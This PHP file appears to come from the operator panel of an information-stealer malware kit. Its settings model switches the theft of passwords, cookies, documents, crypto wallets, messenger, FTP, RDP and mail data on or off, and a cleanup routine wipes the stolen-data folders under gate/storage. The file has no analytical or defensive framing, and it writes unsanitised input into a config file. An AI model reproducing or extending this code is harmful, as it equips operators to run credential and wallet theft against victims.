<?php
	function rrmdir($dir, $res = false)
	{
		if (is_dir($dir))
		{
			$objects = scandir($dir);
			foreach ($objects as $object)
			{
				if ($object != '.' && $object != '..')
				{
					if(filetype("$dir/$object") == 'dir')
					{
						rrmdir("$dir/$object", true);
						rmdir("$dir/$object");
					}
					else unlink("$dir/$object");
				}
			}
			reset($objects);
			if($res) rmdir($res);
		}
	}
	class Model_Settings extends Model
	{
		public function saveChanges($us_login, $us_password, $ac_passwords, $ac_cookies, $ac_docs,
									$ac_docs_ft, $ac_docs_dr, $ac_docs_sz, $ac_docs_st, $ac_wallets,
									$ac_messengers, $ac_ftp_cl, $ac_rdp, $ac_mail, $al_duplicate)
		{
			$strvar = implode(PHP_EOL,
			array(
			"us_login\t\t= \"$us_login\"",
			"us_password\t\t= \"$us_password\"",
			"ac_passwords\t= \"$ac_passwords\"",
			"ac_cookies\t\t= \"$ac_cookies\"",
			"ac_docs\t\t\t= \"$ac_docs\"",
			"ac_docs_ft\t\t= \"$ac_docs_ft\"",
			"ac_docs_dr\t\t= \"$ac_docs_dr\"",
			"ac_docs_sz\t\t= \"$ac_docs_sz\"",
			"ac_docs_st\t\t= \"$ac_docs_st\"",
			"ac_wallets\t\t= \"$ac_wallets\"",
			"ac_messengers\t= \"$ac_messengers\"",
			"ac_ftp_cl\t\t= \"$ac_ftp_cl\"",
			"ac_rdp\t\t\t= \"$ac_rdp\"",
			"ac_mail\t\t\t= \"$ac_mail\"",
			"al_duplicate\t= \"$al_duplicate\""));
			file_put_contents('includes/config.ini', $strvar);
			$_SESSION['hash'] = md5("salt)keckeboot$us_password");
			return true;
		}
		public function cleanAll()
		{
			$fileName = 'gate/storage/wallets/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/rdp/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/passwords/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/imcl/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/ftp/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/cuteftp/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/docs/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/cookies/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/storage/mail/';
			if(file_exists($fileName)) rrmdir($fileName);
			$fileName = 'gate/other/requests.log';
			if(file_exists($fileName)) unlink($fileName);
			return true;
		}
	}
?>